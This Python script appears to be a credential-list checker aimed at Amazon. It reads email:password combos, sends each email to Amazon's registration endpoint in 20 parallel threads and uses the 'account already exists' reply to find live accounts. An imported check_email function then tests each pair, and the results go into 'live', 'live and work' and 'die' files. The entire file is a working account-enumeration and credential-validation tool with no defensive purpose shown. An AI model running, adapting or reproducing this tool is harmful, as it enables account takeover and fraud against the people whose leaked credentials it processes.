import requests 
import concurrent.futures 
from check_mail_amz import check_email 

base_url = "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue"

s = requests.Session()
temp = s.get(base_url)
head = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}

def core(empas):
    print("CORE")
    em,pw = empas.split(":")
    data = {
        'customerName': 'Rain Hard',
        'email': em,
        'password': "asdawd2020",
        "passwordCheck": "asdawd2020",
    }
    
    cek = s.post(base_url, headers=head, data=data).text
    if "You indicated you are a new customer, but an account already exists with the e-mail" in cek:
        if check_email([em, pw]):
            print("LIVE AND WORK :", em, ":", pw)
            live_work.write(em+":"+pw+"\n")
        else:
            print("LIVE :", em, ":", pw)
            live.write(em+":"+pw+"\n")
        return 1
    else:
        print("DIED : ", em,":", pw)
        die.write(em+":"+pw+"\n")
        return 0

def worker(file_in):
    global live 
    global die 
    global live_work
    live = open('live_amz.txt' ,'w')
    die = open('die_amz.txt', 'w')
    live_work = open('live_and_work.txt', 'w')



    empas = [x.strip() for x in open(file_in, 'r').readlines()]
    res = list() 
    print(file_in)
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        completed = executor.map(core, empas)
    
    del empas
    res.extend(completed)

    live.close()
    live_work.close()
    die.close()

    print("DONE.")

if __name__ == "__main__":
    import argparse

    arg = argparse.ArgumentParser()
    arg.add_argument('-i', '--file_in', type=str, required=True)
    args = vars(arg.parse_args())
    
    worker(**args)
